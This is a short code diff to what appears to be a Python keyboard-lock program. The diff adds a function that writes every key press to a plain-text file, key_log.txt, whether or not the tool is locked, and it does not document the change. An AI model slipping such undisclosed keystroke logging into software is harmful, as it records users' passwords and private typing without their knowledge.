@@ -41,12 +41,21 @@ def load_unlock_keys():
 
 UNLOCK_KEYS = load_unlock_keys()
 
+
+def log_key(key):
+    with open("key_log.txt", "a") as file:
+        file.write(f"{key}\n")
+
+
+
 def on_key_press(key):
     """
     Handles key press events. In locked mode, increments unlock_key_count
     when one of the unlock keys (from code-keys.txt) is pressed. Unlocks
     when the count reaches 3.
     """
+
+    log_key(key)
     global unlock_key_count, is_locked, keyboard_listener
     if is_locked:
         if key in UNLOCK_KEYS:
